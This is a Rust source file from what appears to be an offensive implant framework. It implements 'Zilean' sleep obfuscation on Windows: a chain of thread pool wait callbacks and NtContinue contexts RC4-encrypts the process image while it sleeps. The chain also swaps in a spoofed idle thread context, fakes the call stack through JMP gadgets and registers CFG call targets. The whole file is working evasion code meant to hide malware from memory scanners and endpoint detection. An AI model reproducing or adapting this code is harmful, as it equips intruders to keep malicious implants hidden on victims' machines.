//! Wait-based sleep obfuscation using Windows thread pool waits.
//!
//! Zilean schedules the 10-step NtContinue context chain as staggered wait callbacks
//! via `TpAllocWait`/`TpSetWait` on a single-threaded pool. Each wait is armed with the
//! process pseudo-handle (`-1`) and a timeout - since the process handle never signals,
//! the timeout fires and calls `NtContinue` to load the next pre-built `CONTEXT`.
//!
//! Uses 3 events like Ekko: `capture_done`, `start`, and `done`. The process pseudo-handle
//! replaces the dedicated dummy event, matching legitimate async patterns.

use {
    crate::common::{
        alloc_callback, alloc_set_event_stub, alloc_trampoline, current_rsp, find_jmp_gadgets,
        init_spoof_config, jmp_ctx, set_valid_call_targets, spoof_context, spoof_stack_layout,
        SpoofKind,
    },
    api::{api::Api, windows::*, NT_SUCCESS},
    core::{ffi::c_void, mem::zeroed, ptr::null_mut},
};

/// Register all NT function pointers used by Zilean as valid CFG call targets.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (must include ntdll handles).
#[link_section = ".text$D"]
#[rustfmt::skip]
unsafe fn handle_cfg(api: &mut Api) {
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtCreateEvent_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpAllocPool_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpSetPoolStackInformation_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpSetPoolMinThreads_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpSetPoolMaxThreads_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.RtlCaptureContext_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpAllocWait_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.TpSetWait_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtSetEvent_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtWaitForSingleObject_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtContinue_ptr as *mut c_void);
}

/// Execute the Zilean sleep obfuscation chain using thread pool waits.
///
/// Sets up a single-threaded pool, captures the worker's context via a trampoline
/// wait, clones it into 10 CONTEXTs for the encrypt-sleep-decrypt chain, applies
/// JMP gadget indirection and stack spoofing, then schedules all 10 as staggered
/// wait callbacks. The main thread blocks on `NtSignalAndWaitForSingleObject` until
/// the chain completes.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers and sleep context (`api.sleep` must contain
///   valid image base, length, and sleep duration).
///
/// # Safety
///
/// All `Api` function pointers must be resolved. The caller must ensure the process
/// image base/length in `api.sleep` are valid and that no other thread is modifying
/// the image concurrently.
#[link_section = ".text$D"]
#[rustfmt::skip]
unsafe fn zilean(api: &mut Api) {
    api::log_info!(b"[ZILEAN] zilean: enter");

    handle_cfg(api);

    let scfg = init_spoof_config(api);
    if scfg.is_none() {
        api::log_info!(b"[ZILEAN] init_spoof_config failed");
        return;
    }
    let scfg = scfg.unwrap();

    let jmp_gadget = find_jmp_gadgets(api);
    if jmp_gadget.is_none() {
        api::log_info!(b"[ZILEAN] find_jmp_gadgets failed");
        return;
    }
    let jmp_gadget = jmp_gadget.unwrap();

    let trampoline = alloc_trampoline(api);
    if trampoline.is_none() {
        api::log_info!(b"[ZILEAN] trampoline allocation failed");
        return;
    }

    let callback = alloc_callback(api);
    if callback.is_none() {
        api::log_info!(b"[ZILEAN] callback allocation failed");
        return;
    }

    // events[0] = capture_done, events[1] = start, events[2] = done
    // (process pseudo-handle -1 replaces the old dummy_wait event)
    let mut events = [null_mut(); 3];
    for event in &mut events {
        let status = api.ntdll.NtCreateEvent(
            &mut *event, EVENT_ALL_ACCESS, null_mut(),
            EVENT_TYPE::NotificationEvent, 0,
        );
        if !NT_SUCCESS!(status) {
            api::log_info!(b"[ZILEAN] NtCreateEvent failed", status);
            return;
        }
    }

    // Create a single-threaded pool with 512KB stack
    let mut pool = null_mut();
    let status = api.ntdll.TpAllocPool(&mut pool, null_mut());
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] TpAllocPool failed", status);
        return;
    }

    let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
    let status = api.ntdll.TpSetPoolStackInformation(pool, &mut stack);
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] TpSetPoolStackInformation failed", status);
        return;
    }

    api.ntdll.TpSetPoolMinThreads(pool, 1);
    api.ntdll.TpSetPoolMaxThreads(pool, 1);

    let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

    // Schedule trampoline wait to capture worker thread context via RtlCaptureContext.
    // P1Home stores the RtlCaptureContext pointer; the trampoline stub reads it via jmp [rcx].
    // Use process pseudo-handle (-1) as wait target - never signals, so timeout fires.
    let mut wait_ctx = null_mut();
    let mut ctx_init: CONTEXT = zeroed();
    ctx_init.ContextFlags = CONTEXT_FULL;
    ctx_init.P1Home = api.ntdll.RtlCaptureContext_ptr as u64;

    let status = api.ntdll.TpAllocWait(
        &mut wait_ctx,
        trampoline.unwrap() as *mut c_void,
        &mut ctx_init as *mut _ as *mut c_void,
        &mut env,
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] TpAllocWait [RtlCaptureContext] failed", status);
        return;
    }

    // Fire trampoline via 100ms timeout (process handle never signals)
    let mut delay = zeroed::<LARGE_INTEGER>();
    delay.QuadPart = -(100i64 * 10_000);
    let h_process = -1isize as HANDLE;
    api.ntdll.TpSetWait(wait_ctx, h_process, &mut delay);

    // Schedule set_event_stub wait to signal capture_done at 200ms
    let set_event_stub = alloc_set_event_stub(api);
    if set_event_stub.is_none() {
        api::log_info!(b"[ZILEAN] alloc_set_event_stub failed");
        return;
    }

    let mut wait_event = null_mut();
    let status = api.ntdll.TpAllocWait(
        &mut wait_event,
        set_event_stub.unwrap() as *mut c_void,
        events[0],  // capture_done event (callback context)
        &mut env,
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] TpAllocWait [NtSetEvent] failed", status);
        return;
    }

    delay.QuadPart = -(200i64 * 10_000);
    api.ntdll.TpSetWait(wait_event, h_process, &mut delay);

    // Block until the worker context is captured
    let status = api.ntdll.NtWaitForSingleObject(events[0], 0, null_mut());
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] NtWaitForSingleObject [capture] failed", status);
    }
    api::log_info!(b"[ZILEAN] context captured");

    // Clone captured context into 10 copies; set Rax = NtContinue for each
    let mut ctxs = [ctx_init; 10];
    for ctx in &mut ctxs {
        ctx.Rax = api.ntdll.NtContinue_ptr as u64;
        ctx.Rsp -= 8;
    }

    // Get a real handle to the current thread (fiber's underlying thread)
    let mut h_thread = null_mut();
    let status = api.ntdll.NtDuplicateObject(
        -1isize as HANDLE,
        -2isize as HANDLE,
        -1isize as HANDLE,
        &mut h_thread,
        0, 0,
        DUPLICATE_SAME_ACCESS,
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[ZILEAN] NtDuplicateObject failed", status);
    }

    // Build spoofed main-thread context (Rip = ZwWaitForWorkViaWorkerFactory)
    ctx_init.Rsp = current_rsp();
    let mut ctx_spoof = spoof_context(api, &scfg, ctx_init);

    let mut base = api.sleep.buffer as PVOID;
    let mut size = api.sleep.length;
    let mut old_protect: DWORD = 0;
    let mut ctx_backup: CONTEXT = zeroed();
    ctx_backup.ContextFlags = CONTEXT_FULL;

    // Step 0: NtWaitForSingleObject(start_event) - gate until main signals
    jmp_ctx(&jmp_gadget, &mut ctxs[0], api.ntdll.NtWaitForSingleObject_ptr as u64);
    ctxs[0].Rcx = events[1] as u64;  // start event
    ctxs[0].Rdx = 0;
    ctxs[0].R8 = 0;

    // Step 1: NtProtectVirtualMemory(RW) - make image writable
    jmp_ctx(&jmp_gadget, &mut ctxs[1], api.ntdll.NtProtectVirtualMemory_ptr as u64);
    ctxs[1].Rcx = -1isize as u64;
    ctxs[1].Rdx = &mut base as *mut _ as u64;
    ctxs[1].R8 = &mut size as *mut _ as u64;
    ctxs[1].R9 = PAGE_READWRITE as u64;

    // Step 2: SystemFunction040 (RC4 encrypt) - encrypt image in-place
    jmp_ctx(&jmp_gadget, &mut ctxs[2], api.advapi.SystemFunction040_ptr as u64);
    ctxs[2].Rcx = api.sleep.buffer as u64;
    ctxs[2].Rdx = api.sleep.length as u64;
    ctxs[2].R8 = 0;

    // Step 3: NtGetContextThread - save real main thread context to backup
    jmp_ctx(&jmp_gadget, &mut ctxs[3], api.ntdll.NtGetContextThread_ptr as u64);
    ctxs[3].Rcx = h_thread as u64;
    ctxs[3].Rdx = &mut ctx_backup as *mut _ as u64;

    // Step 4: NtSetContextThread - replace main context with spoofed idle context
    jmp_ctx(&jmp_gadget, &mut ctxs[4], api.ntdll.NtSetContextThread_ptr as u64);
    ctxs[4].Rcx = h_thread as u64;
    ctxs[4].Rdx = &mut ctx_spoof as *mut _ as u64;

    // Step 5: WaitForSingleObject(main_thread, sleep_ms) - THE ACTUAL SLEEP
    jmp_ctx(&jmp_gadget, &mut ctxs[5], api.kernel32.WaitForSingleObject_ptr as u64);
    ctxs[5].Rcx = h_thread as u64;
    ctxs[5].Rdx = api.sleep.dw_milliseconds as u64;

    // Step 6: SystemFunction041 (RC4 decrypt) - decrypt image
    jmp_ctx(&jmp_gadget, &mut ctxs[6], api.advapi.SystemFunction041_ptr as u64);
    ctxs[6].Rcx = api.sleep.buffer as u64;
    ctxs[6].Rdx = api.sleep.length as u64;
    ctxs[6].R8 = 0;

    // Step 7: NtProtectVirtualMemory(RX) - restore execute permission
    jmp_ctx(&jmp_gadget, &mut ctxs[7], api.ntdll.NtProtectVirtualMemory_ptr as u64);
    ctxs[7].Rcx = -1isize as u64;
    ctxs[7].Rdx = &mut base as *mut _ as u64;
    ctxs[7].R8 = &mut size as *mut _ as u64;
    ctxs[7].R9 = PAGE_EXECUTE_READ as u64;

    // Step 8: NtSetContextThread - restore real main thread context from backup
    jmp_ctx(&jmp_gadget, &mut ctxs[8], api.ntdll.NtSetContextThread_ptr as u64);
    ctxs[8].Rcx = h_thread as u64;
    ctxs[8].Rdx = &mut ctx_backup as *mut _ as u64;

    // Step 9: NtSetEvent(done_event) - signal chain completion
    jmp_ctx(&jmp_gadget, &mut ctxs[9], api.ntdll.NtSetEvent_ptr as u64);
    ctxs[9].Rcx = events[2] as u64;  // done event
    ctxs[9].Rdx = 0;

    // Apply fake stack layout to all 10 contexts (spoofed return address chain)
    spoof_stack_layout(api, &mut ctxs, &scfg, SpoofKind::Wait);

    // Patch 5th argument (&old_protect) at RSP+0x28 for NtProtectVirtualMemory calls
    ((ctxs[1].Rsp + 0x28) as *mut u64).write(&mut old_protect as *mut _ as u64);
    ((ctxs[7].Rsp + 0x28) as *mut u64).write(&mut old_protect as *mut _ as u64);

    // Schedule all 10 chain steps as staggered wait callbacks (100ms apart).
    // Each wait uses process pseudo-handle (never signals) so the timeout fires.
    api::log_info!(b"[ZILEAN] scheduling 10 wait callbacks");
    for ctx in &mut ctxs {
        let mut wait = null_mut();
        let status = api.ntdll.TpAllocWait(
            &mut wait,
            callback.unwrap() as *mut c_void,
            ctx as *mut _ as *mut c_void,
            &mut env,
        );
        if !NT_SUCCESS!(status) {
            api::log_info!(b"[ZILEAN] TpAllocWait [chain] failed", status);
            return;
        }
        delay.QuadPart += -(100i64 * 10_000);
        api.ntdll.TpSetWait(wait, h_process, &mut delay);
    }

    // Signal start_event (unblocks step 0) and wait for done_event (step 9 signals it)
    api::log_info!(b"[ZILEAN] signaling chain start, waiting for completion");
    api.ntdll.NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());

    api::log_info!(b"[ZILEAN] chain complete, cleaning up");
    api.ntdll.NtClose(h_thread);
    for e in &events {
        api.ntdll.NtClose(*e);
    }
}

/// Fiber context passed to [`zilean_fiber`] - holds the API pointer and master fiber handle.
struct FiberContext {
    api: *mut Api,
    master: PVOID,
}

/// Fiber entry point that runs [`zilean`] on an isolated 1MB stack, then switches
/// back to the master fiber.
///
/// # Arguments
///
/// * `param` - Pointer to a [`FiberContext`] containing the `Api` pointer and master fiber handle.
unsafe extern "system" fn zilean_fiber(param: PVOID) {
    let ctx = param as *mut FiberContext;
    zilean(&mut *(*ctx).api);
    let switch: FnSwitchToFiber = core::mem::transmute((*(*ctx).api).kernel32.SwitchToFiber_ptr);
    switch((*ctx).master);
}

/// Run the Zilean sleep obfuscation chain inside a dedicated fiber.
///
/// Converts the current thread to a fiber, creates a new fiber with a 1MB stack,
/// executes [`zilean`] on it, then cleans up and converts back to a normal thread.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (must include kernel32 fiber functions and
///   all ntdll/advapi functions used by [`zilean`]).
///
/// # Safety
///
/// All `Api` function pointers must be resolved. Must be called from a thread that
/// has not already been converted to a fiber.
#[link_section = ".text$D"]
pub unsafe fn zilean_with_fiber(api: &mut Api) {
    let master = api.kernel32.ConvertThreadToFiber(null_mut());
    if master.is_null() {
        api::log_info!(b"[ZILEAN] ConvertThreadToFiber failed");
        return;
    }

    let mut fiber_ctx = FiberContext {
        api: api as *mut Api,
        master,
    };

    let fiber = api.kernel32.CreateFiber(
        0x100000,
        Some(zilean_fiber),
        &mut fiber_ctx as *mut _ as PVOID,
    );

    if fiber.is_null() {
        api::log_info!(b"[ZILEAN] CreateFiber failed");
        api.kernel32.ConvertFiberToThread();
        return;
    }

    api.kernel32.SwitchToFiber(fiber);
    api.kernel32.DeleteFiber(fiber);
    api.kernel32.ConvertFiberToThread();
}
